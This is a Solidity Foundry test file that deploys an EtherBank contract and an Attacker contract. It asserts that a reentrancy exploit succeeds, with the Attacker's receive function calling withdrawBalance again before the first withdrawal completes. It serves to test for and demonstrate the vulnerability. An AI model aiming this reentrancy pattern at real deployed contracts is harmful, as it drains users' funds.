
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../src/EtherBank.sol";

contract TestReentrancyEtherBank is Test {
    
    EtherBank public _contractUnderTest;
    
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new EtherBank();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        vm.assume(attackVal > 0.01 ether && attackVal < 100 ether);

        vm.deal(address(_contractUnderTest), attackVal * 2); 
        
        vm.deal(address(_attacker), attackVal * 2);

        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    EtherBank public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;

    constructor(address victimAddress) { 
        _victim = EtherBank(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        
        _victim.addToBalance{value: val}();
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;

        _victim.withdrawBalance();

        if (attackCallCount >= 2) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        attackCallCount++;
        if (attackCallCount < 2) {            
            _victim.withdrawBalance();
        }
    }
}
